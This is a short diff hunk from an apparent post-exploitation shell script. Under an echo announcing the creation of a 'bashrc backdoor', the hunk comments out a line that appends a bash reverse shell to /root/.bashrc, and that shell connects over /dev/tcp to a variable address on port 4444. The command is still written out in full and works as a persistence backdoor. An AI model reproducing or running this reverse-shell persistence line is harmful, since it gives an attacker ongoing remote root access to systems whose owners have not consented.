@@ -35,7 +35,7 @@ sleep 1
 
 echo "[+] creating bashrc backdoor"
 
-echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc
+#echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc
 
 sleep 1
 
